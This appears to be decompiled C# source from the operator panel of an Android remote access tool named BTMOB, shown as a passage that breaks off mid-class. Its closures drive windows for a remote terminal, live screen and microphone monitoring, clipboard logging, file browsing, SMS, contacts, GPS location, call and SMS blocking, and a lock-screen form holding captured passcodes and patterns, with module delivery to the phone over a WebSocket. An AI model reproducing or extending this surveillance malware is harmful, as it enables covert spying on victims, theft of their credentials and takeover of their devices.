#define DEBUG
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using BTMOB.My;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using ImageMagick;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Signers;

namespace BTMOB;

public sealed class BTEngine
{
	public class SecureClientInfo
	{
		public string SignPublicKey { get; set; }

		public string ExchangePublicKey { get; set; }

		public byte[] SharedSecret { get; set; }
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D0
	{
		public BTClient _0024VB_0024Local_classclient;

		public _Closure_0024__15_002D0(_Closure_0024__15_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_classclient = arg0._0024VB_0024Local_classclient;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			MainForm.DynamicMsg(BTConst.scrchngdstr, _0024VB_0024Local_classclient.wallpaper);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D1
	{
		public ScreenReader _0024VB_0024Local_screenform;

		public string _0024VB_0024Local_screenorintaion;

		public _Closure_0024__15_002D1(_Closure_0024__15_002D1 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_screenform = arg0._0024VB_0024Local_screenform;
				_0024VB_0024Local_screenorintaion = arg0._0024VB_0024Local_screenorintaion;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__1()
		{
			_0024VB_0024Local_screenform.myscr.Visible = false;
		}

		[SpecialName]
		internal void _Lambda_0024__2()
		{
			Rectangle workingArea = Screen.FromControl(_0024VB_0024Local_screenform).WorkingArea;
			string left = _0024VB_0024Local_screenorintaion;
			checked
			{
				Size size = default(Size);
				if (Operators.CompareString(left, "P", TextCompare: false) != 0)
				{
					if (Operators.CompareString(left, "L", TextCompare: false) == 0)
					{
						int num = (int)Math.Round((double)workingArea.Width * 0.6);
						int height = (int)Math.Round((double)num * 9.0 / 16.0);
						size = new Size(num, height);
					}
				}
				else
				{
					int num2 = (int)Math.Round((double)workingArea.Height * 0.9);
					int width = (int)Math.Round((double)num2 * 9.0 / 16.0);
					size = new Size(width, num2);
				}
				_0024VB_0024Local_screenform.Size = size;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D10
	{
		public terminal _0024VB_0024Local_terminalform;

		public string _0024VB_0024Local_handle;

		public BTClient _0024VB_0024Local_classclient;

		public _Closure_0024__15_002D10(_Closure_0024__15_002D10 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_terminalform = arg0._0024VB_0024Local_terminalform;
				_0024VB_0024Local_handle = arg0._0024VB_0024Local_handle;
				_0024VB_0024Local_classclient = arg0._0024VB_0024Local_classclient;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D11
	{
		public string _0024VB_0024Local_andver;

		public _Closure_0024__15_002D10 _0024VB_0024NonLocal__0024VB_0024Closure_8;

		public _Closure_0024__15_002D11(_Closure_0024__15_002D11 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_andver = arg0._0024VB_0024Local_andver;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__9()
		{
			if (_0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_terminalform == null)
			{
				_0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_terminalform = new terminal();
				_0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_terminalform.Name = _0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_handle;
				_0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_terminalform.androidver = _0024VB_0024Local_andver;
				_0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_terminalform.mytype = "Normal";
				_0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_terminalform.BTcli = _0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_classclient;
				_0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_terminalform.Show();
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D12
	{
		public string _0024VB_0024Local_response;

		public _Closure_0024__15_002D10 _0024VB_0024NonLocal__0024VB_0024Closure_9;

		public _Closure_0024__15_002D12(_Closure_0024__15_002D12 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_response = arg0._0024VB_0024Local_response;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__10()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_9._0024VB_0024Local_terminalform.printterminal(_0024VB_0024Local_response);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D13
	{
		public Clipboard _0024VB_0024Local_clipform;

		public string _0024VB_0024Local_handle;

		public BTClient _0024VB_0024Local_classclient;

		public string _0024VB_0024Local_clipdata;

		public _Closure_0024__15_002D5 _0024VB_0024NonLocal__0024VB_0024Closure_10;

		public _Closure_0024__15_002D13(_Closure_0024__15_002D13 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_clipform = arg0._0024VB_0024Local_clipform;
				_0024VB_0024Local_handle = arg0._0024VB_0024Local_handle;
				_0024VB_0024Local_classclient = arg0._0024VB_0024Local_classclient;
				_0024VB_0024Local_clipdata = arg0._0024VB_0024Local_clipdata;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__11()
		{
			if (_0024VB_0024Local_clipform == null)
			{
				_0024VB_0024Local_clipform = new Clipboard();
				_0024VB_0024Local_clipform.Tag = "Clips" + _0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024Local_mobid;
				_0024VB_0024Local_clipform.Name = _0024VB_0024Local_handle;
				_0024VB_0024Local_clipform.mobid = _0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024Local_mobid;
				_0024VB_0024Local_clipform.WSClient = _0024VB_0024Local_classclient.Serverins.WSClient;
				_0024VB_0024Local_clipform.Show();
			}
			_0024VB_0024Local_clipform.logclipboard.Text = _0024VB_0024Local_clipdata;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D14
	{
		public filesmanager _0024VB_0024Local_FileManager;

		public string _0024VB_0024Local_handle;

		public BTClient _0024VB_0024Local_classclient;

		public string _0024VB_0024Local_stringtagpath;

		public List<filesmanager.FileRow> _0024VB_0024Local_fileRows;

		public _Closure_0024__15_002D5 _0024VB_0024NonLocal__0024VB_0024Closure_11;

		public _Closure_0024__15_002D14(_Closure_0024__15_002D14 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_FileManager = arg0._0024VB_0024Local_FileManager;
				_0024VB_0024Local_handle = arg0._0024VB_0024Local_handle;
				_0024VB_0024Local_classclient = arg0._0024VB_0024Local_classclient;
				_0024VB_0024Local_stringtagpath = arg0._0024VB_0024Local_stringtagpath;
				_0024VB_0024Local_fileRows = arg0._0024VB_0024Local_fileRows;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__12()
		{
			if (_0024VB_0024Local_FileManager == null)
			{
				_0024VB_0024Local_FileManager = new filesmanager();
				_0024VB_0024Local_FileManager.Tag = "Files" + _0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024Local_mobid;
				_0024VB_0024Local_FileManager.Name = _0024VB_0024Local_handle;
				_0024VB_0024Local_FileManager.Btcli = _0024VB_0024Local_classclient;
				_0024VB_0024Local_FileManager.listfilesvew.Tag = "";
				_0024VB_0024Local_FileManager.listfilesvew.ListViewItemSorter = null;
				_0024VB_0024Local_FileManager.Show();
			}
			_0024VB_0024Local_FileManager.emptytext.Visible = false;
			_0024VB_0024Local_FileManager.emptytext.SendToBack();
			_0024VB_0024Local_FileManager.listfilesvew.BeginUpdate();
			_0024VB_0024Local_FileManager.listfilesvew.ClearObjects();
			_0024VB_0024Local_FileManager.baseloader.Enabled = false;
			_0024VB_0024Local_FileManager.baseloader.Visible = false;
		}

		[SpecialName]
		internal void _Lambda_0024__16()
		{
			_0024VB_0024Local_FileManager.listfilesvew.Tag = _0024VB_0024Local_stringtagpath;
			_0024VB_0024Local_FileManager.PBtitlebar.Value = 0;
			_0024VB_0024Local_FileManager.listfilesvew.SetObjects(_0024VB_0024Local_fileRows);
			_0024VB_0024Local_FileManager.listfilesvew.EndUpdate();
			_0024VB_0024Local_FileManager.isloading = false;
			_0024VB_0024Local_FileManager.pathtxt.Text = Conversions.ToString(_0024VB_0024Local_FileManager.listfilesvew.Tag);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D15
	{
		public double _0024VB_0024Local_storeusedValue;

		public double _0024VB_0024Local_storesizeValue;

		public _Closure_0024__15_002D14 _0024VB_0024NonLocal__0024VB_0024Closure_12;

		public _Closure_0024__15_002D15(_Closure_0024__15_002D15 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_storeusedValue = arg0._0024VB_0024Local_storeusedValue;
				_0024VB_0024Local_storesizeValue = arg0._0024VB_0024Local_storesizeValue;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D16
	{
		public int _0024VB_0024Local_percentageUsed;

		public _Closure_0024__15_002D15 _0024VB_0024NonLocal__0024VB_0024Closure_13;

		public _Closure_0024__15_002D16(_Closure_0024__15_002D16 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_percentageUsed = arg0._0024VB_0024Local_percentageUsed;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__13()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_FileManager.usagetitle.Text = $"Storage : {_0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_storeusedValue} GB of {_0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_storesizeValue} GB used";
			_0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_FileManager.usageprecent.Value = _0024VB_0024Local_percentageUsed;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D17
	{
		public Dictionary<string, object> _0024VB_0024Local_file;

		public int _0024VB_0024Local_parvalue;

		public _Closure_0024__15_002D14 _0024VB_0024NonLocal__0024VB_0024Closure_14;

		public _Closure_0024__15_002D17(_Closure_0024__15_002D17 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_file = arg0._0024VB_0024Local_file;
				_0024VB_0024Local_parvalue = arg0._0024VB_0024Local_parvalue;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__14()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_14._0024VB_0024Local_FileManager.listfilesvew.Tag = _0024VB_0024Local_file["path"].ToString();
			_0024VB_0024NonLocal__0024VB_0024Closure_14._0024VB_0024Local_stringtagpath = Conversions.ToString(_0024VB_0024Local_file["path"]);
			_0024VB_0024NonLocal__0024VB_0024Closure_14._0024VB_0024Local_FileManager.emptytext.Visible = true;
			_0024VB_0024NonLocal__0024VB_0024Closure_14._0024VB_0024Local_FileManager.emptytext.BringToFront();
			_0024VB_0024NonLocal__0024VB_0024Closure_14._0024VB_0024Local_FileManager.pathtxt.Text = Conversions.ToString(_0024VB_0024NonLocal__0024VB_0024Closure_14._0024VB_0024Local_FileManager.listfilesvew.Tag);
		}

		[SpecialName]
		internal void _Lambda_0024__15()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_14._0024VB_0024Local_FileManager.PBtitlebar.Value = _0024VB_0024Local_parvalue;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D18
	{
		public int _0024VB_0024Local_lastindexclick;

		public _Closure_0024__15_002D14 _0024VB_0024NonLocal__0024VB_0024Closure_15;

		public _Closure_0024__15_002D18(_Closure_0024__15_002D18 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_lastindexclick = arg0._0024VB_0024Local_lastindexclick;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__17()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_15._0024VB_0024Local_FileManager.listfilesvew.Items[_0024VB_0024Local_lastindexclick].Selected = true;
			_0024VB_0024NonLocal__0024VB_0024Closure_15._0024VB_0024Local_FileManager.listfilesvew.EnsureVisible(_0024VB_0024Local_lastindexclick);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D19
	{
		public MicMonitor _0024VB_0024Local_micform;

		public _Closure_0024__15_002D19(_Closure_0024__15_002D19 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_micform = arg0._0024VB_0024Local_micform;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__19()
		{
			_0024VB_0024Local_micform.mictoolbox.Enabled = true;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D2
	{
		public ScreenMonitor _0024VB_0024Local_screenform;

		public _Closure_0024__15_002D2(_Closure_0024__15_002D2 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_screenform = arg0._0024VB_0024Local_screenform;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__3()
		{
			_0024VB_0024Local_screenform.myscr.Visible = false;
			_0024VB_0024Local_screenform.baseloader.Enabled = false;
			_0024VB_0024Local_screenform.baseloader.Visible = false;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D20
	{
		public string _0024VB_0024Local_neededzips;

		public _Closure_0024__15_002D5 _0024VB_0024NonLocal__0024VB_0024Closure_16;

		public _Closure_0024__15_002D20(_Closure_0024__15_002D20 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_neededzips = arg0._0024VB_0024Local_neededzips;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__21()
		{
			sendjects(_0024VB_0024Local_neededzips, _0024VB_0024NonLocal__0024VB_0024Closure_16._0024VB_0024Local_mobid, _0024VB_0024NonLocal__0024VB_0024Closure_16._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf.WSClient);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D21
	{
		public ServersInfo _0024VB_0024Local_srverinf;

		public _Closure_0024__15_002D21(_Closure_0024__15_002D21 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_srverinf = arg0._0024VB_0024Local_srverinf;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D22
	{
		public AppsManager _0024VB_0024Local_appsform;

		public string _0024VB_0024Local_handle;

		public _Closure_0024__15_002D22(_Closure_0024__15_002D22 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_appsform = arg0._0024VB_0024Local_appsform;
				_0024VB_0024Local_handle = arg0._0024VB_0024Local_handle;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D23
	{
		public BTClient _0024VB_0024Local_classclient;

		public List<DataGridViewRow> _0024VB_0024Local_rowsToAdd;

		public string _0024VB_0024Local_isactivestr;

		public _Closure_0024__15_002D22 _0024VB_0024NonLocal__0024VB_0024Closure_17;

		public _Closure_0024__15_002D23(_Closure_0024__15_002D23 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_classclient = arg0._0024VB_0024Local_classclient;
				_0024VB_0024Local_rowsToAdd = arg0._0024VB_0024Local_rowsToAdd;
				_0024VB_0024Local_isactivestr = arg0._0024VB_0024Local_isactivestr;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__22()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform = new AppsManager();
			_0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.Name = _0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_handle;
			_0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.Btcli = _0024VB_0024Local_classclient;
			_0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.Show();
		}

		[SpecialName]
		internal void _Lambda_0024__23()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.DGV_CLONE.Rows.Clear();
			_0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.DGV_CLONE.Rows.AddRange(_0024VB_0024Local_rowsToAdd.ToArray());
			if (Operators.CompareString(_0024VB_0024Local_isactivestr, "1", TextCompare: false) == 0)
			{
				_0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.enablebtn.Enabled = false;
				_0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.disablebtn.Enabled = true;
			}
			else
			{
				_0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.enablebtn.Enabled = true;
				_0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.disablebtn.Enabled = false;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D24
	{
		public AppsManager _0024VB_0024Local_appsform;

		public string _0024VB_0024Local_handle;

		public _Closure_0024__15_002D24(_Closure_0024__15_002D24 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_appsform = arg0._0024VB_0024Local_appsform;
				_0024VB_0024Local_handle = arg0._0024VB_0024Local_handle;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D25
	{
		public BTClient _0024VB_0024Local_classclient;

		public _Closure_0024__15_002D24 _0024VB_0024NonLocal__0024VB_0024Closure_18;

		public _Closure_0024__15_002D25(_Closure_0024__15_002D25 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_classclient = arg0._0024VB_0024Local_classclient;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__24()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_appsform = new AppsManager();
			_0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_appsform.Name = _0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_handle;
			_0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_appsform.Btcli = _0024VB_0024Local_classclient;
			_0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_appsform.Show();
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D26
	{
		public List<DataGridViewRow> _0024VB_0024Local_rowsToAdd;

		public _Closure_0024__15_002D25 _0024VB_0024NonLocal__0024VB_0024Closure_19;

		public _Closure_0024__15_002D26(_Closure_0024__15_002D26 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_rowsToAdd = arg0._0024VB_0024Local_rowsToAdd;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__25()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_19._0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_appsform.DGV0.Rows.Clear();
			_0024VB_0024NonLocal__0024VB_0024Closure_19._0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_appsform.DGV0.Rows.AddRange(_0024VB_0024Local_rowsToAdd.ToArray());
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D27
	{
		public Blocker _0024VB_0024Local_blockform;

		public _Closure_0024__15_002D27(_Closure_0024__15_002D27 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_blockform = arg0._0024VB_0024Local_blockform;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D28
	{
		public string _0024VB_0024Local_isSmsmng;

		public string _0024VB_0024Local_isCallmng;

		public _Closure_0024__15_002D27 _0024VB_0024NonLocal__0024VB_0024Closure_20;

		public _Closure_0024__15_002D28(_Closure_0024__15_002D28 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_isSmsmng = arg0._0024VB_0024Local_isSmsmng;
				_0024VB_0024Local_isCallmng = arg0._0024VB_0024Local_isCallmng;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__26()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_20._0024VB_0024Local_blockform.activesms.Checked = Operators.CompareString(_0024VB_0024Local_isSmsmng, "1", TextCompare: false) == 0;
			_0024VB_0024NonLocal__0024VB_0024Closure_20._0024VB_0024Local_blockform.activecalls.Checked = Operators.CompareString(_0024VB_0024Local_isCallmng, "1", TextCompare: false) == 0;
			_0024VB_0024NonLocal__0024VB_0024Closure_20._0024VB_0024Local_blockform.activesms.Enabled = !_0024VB_0024NonLocal__0024VB_0024Closure_20._0024VB_0024Local_blockform.activesms.Checked;
			_0024VB_0024NonLocal__0024VB_0024Closure_20._0024VB_0024Local_blockform.activecalls.Enabled = !_0024VB_0024NonLocal__0024VB_0024Closure_20._0024VB_0024Local_blockform.activecalls.Checked;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D29
	{
		public List<DataGridViewRow> _0024VB_0024Local_rowsToAdd;

		public _Closure_0024__15_002D27 _0024VB_0024NonLocal__0024VB_0024Closure_21;

		public _Closure_0024__15_002D29(_Closure_0024__15_002D29 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_rowsToAdd = arg0._0024VB_0024Local_rowsToAdd;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__27()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_21._0024VB_0024Local_blockform.DGV_SMS.Rows.AddRange(_0024VB_0024Local_rowsToAdd.ToArray());
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D3
	{
		public string _0024VB_0024Local_screenorintaion;

		public _Closure_0024__15_002D2 _0024VB_0024NonLocal__0024VB_0024Closure_3;

		public _Closure_0024__15_002D3(_Closure_0024__15_002D3 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_screenorintaion = arg0._0024VB_0024Local_screenorintaion;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__4()
		{
			Rectangle workingArea = Screen.FromControl(_0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform).WorkingArea;
			string left = _0024VB_0024Local_screenorintaion;
			checked
			{
				Size size = default(Size);
				if (Operators.CompareString(left, "P", TextCompare: false) != 0)
				{
					if (Operators.CompareString(left, "L", TextCompare: false) == 0)
					{
						int num = (int)Math.Round((double)workingArea.Width * 0.6);
						int height = (int)Math.Round((double)num * 9.0 / 16.0);
						size = new Size(num, height);
					}
				}
				else
				{
					int num2 = (int)Math.Round((double)workingArea.Height * 0.9);
					int width = (int)Math.Round((double)num2 * 9.0 / 16.0);
					size = new Size(width, num2);
				}
				_0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_screenform.Size = size;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D30
	{
		public List<DataGridViewRow> _0024VB_0024Local_rowsToAdd;

		public _Closure_0024__15_002D27 _0024VB_0024NonLocal__0024VB_0024Closure_22;

		public _Closure_0024__15_002D30(_Closure_0024__15_002D30 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_rowsToAdd = arg0._0024VB_0024Local_rowsToAdd;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__28()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_22._0024VB_0024Local_blockform.DGVCALLS.Rows.Clear();
			_0024VB_0024NonLocal__0024VB_0024Closure_22._0024VB_0024Local_blockform.DGVCALLS.Rows.AddRange(_0024VB_0024Local_rowsToAdd.ToArray());
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D31
	{
		public Chat _0024VB_0024Local_chatform;

		public string _0024VB_0024Local_newmsg;

		public _Closure_0024__15_002D31(_Closure_0024__15_002D31 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_chatform = arg0._0024VB_0024Local_chatform;
				_0024VB_0024Local_newmsg = arg0._0024VB_0024Local_newmsg;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__29()
		{
			_0024VB_0024Local_chatform.AppendToChat(isFromClient: true, _0024VB_0024Local_newmsg);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D32
	{
		public ContactsManager _0024VB_0024Local_contsform;

		public string _0024VB_0024Local_handle;

		public _Closure_0024__15_002D32(_Closure_0024__15_002D32 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_contsform = arg0._0024VB_0024Local_contsform;
				_0024VB_0024Local_handle = arg0._0024VB_0024Local_handle;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D33
	{
		public BTClient _0024VB_0024Local_classclient;

		public _Closure_0024__15_002D32 _0024VB_0024NonLocal__0024VB_0024Closure_23;

		public _Closure_0024__15_002D33(_Closure_0024__15_002D33 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_classclient = arg0._0024VB_0024Local_classclient;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__30()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_23._0024VB_0024Local_contsform = new ContactsManager();
			_0024VB_0024NonLocal__0024VB_0024Closure_23._0024VB_0024Local_contsform.Name = _0024VB_0024NonLocal__0024VB_0024Closure_23._0024VB_0024Local_handle;
			_0024VB_0024NonLocal__0024VB_0024Closure_23._0024VB_0024Local_contsform.Btcli = _0024VB_0024Local_classclient;
			_0024VB_0024NonLocal__0024VB_0024Closure_23._0024VB_0024Local_contsform.Show();
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D34
	{
		public List<DataGridViewRow> _0024VB_0024Local_rowsToAdd;

		public _Closure_0024__15_002D33 _0024VB_0024NonLocal__0024VB_0024Closure_24;

		public _Closure_0024__15_002D34(_Closure_0024__15_002D34 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_rowsToAdd = arg0._0024VB_0024Local_rowsToAdd;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__31()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_24._0024VB_0024NonLocal__0024VB_0024Closure_23._0024VB_0024Local_contsform.DGV0.Rows.AddRange(_0024VB_0024Local_rowsToAdd.ToArray());
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D35
	{
		public LocationMap _0024VB_0024Local_locform;

		public string _0024VB_0024Local_latitude;

		public string _0024VB_0024Local_longitude;

		public _Closure_0024__15_002D35(_Closure_0024__15_002D35 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_locform = arg0._0024VB_0024Local_locform;
				_0024VB_0024Local_latitude = arg0._0024VB_0024Local_latitude;
				_0024VB_0024Local_longitude = arg0._0024VB_0024Local_longitude;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__32()
		{
			_0024VB_0024Local_locform.UpdateMap(double.Parse(_0024VB_0024Local_latitude), double.Parse(_0024VB_0024Local_longitude));
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D36
	{
		public SmsManager _0024VB_0024Local_smsform;

		public string _0024VB_0024Local_handle;

		public _Closure_0024__15_002D36(_Closure_0024__15_002D36 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_smsform = arg0._0024VB_0024Local_smsform;
				_0024VB_0024Local_handle = arg0._0024VB_0024Local_handle;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D37
	{
		public BTClient _0024VB_0024Local_classclient;

		public _Closure_0024__15_002D36 _0024VB_0024NonLocal__0024VB_0024Closure_25;

		public _Closure_0024__15_002D37(_Closure_0024__15_002D37 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_classclient = arg0._0024VB_0024Local_classclient;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__33()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_25._0024VB_0024Local_smsform = new SmsManager();
			_0024VB_0024NonLocal__0024VB_0024Closure_25._0024VB_0024Local_smsform.Name = _0024VB_0024NonLocal__0024VB_0024Closure_25._0024VB_0024Local_handle;
			_0024VB_0024NonLocal__0024VB_0024Closure_25._0024VB_0024Local_smsform.Btcli = _0024VB_0024Local_classclient;
			_0024VB_0024NonLocal__0024VB_0024Closure_25._0024VB_0024Local_smsform.Show();
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D38
	{
		public List<DataGridViewRow> _0024VB_0024Local_rowsToAdd;

		public _Closure_0024__15_002D37 _0024VB_0024NonLocal__0024VB_0024Closure_26;

		public _Closure_0024__15_002D38(_Closure_0024__15_002D38 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_rowsToAdd = arg0._0024VB_0024Local_rowsToAdd;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__34()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_26._0024VB_0024NonLocal__0024VB_0024Closure_25._0024VB_0024Local_smsform.DGV0.Rows.AddRange(_0024VB_0024Local_rowsToAdd.ToArray());
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D39
	{
		public WebBrowser _0024VB_0024Local_browserform;

		public _Closure_0024__15_002D39(_Closure_0024__15_002D39 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_browserform = arg0._0024VB_0024Local_browserform;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D4
	{
		public lockscreen _0024VB_0024Local_lockerform;

		public string _0024VB_0024Local_handle;

		public BTClient _0024VB_0024Local_classclient;

		public string _0024VB_0024Local_capturelock;

		public string _0024VB_0024Local_passcods;

		public bool _0024VB_0024Local_islocked;

		public _Closure_0024__15_002D5 _0024VB_0024NonLocal__0024VB_0024Closure_4;

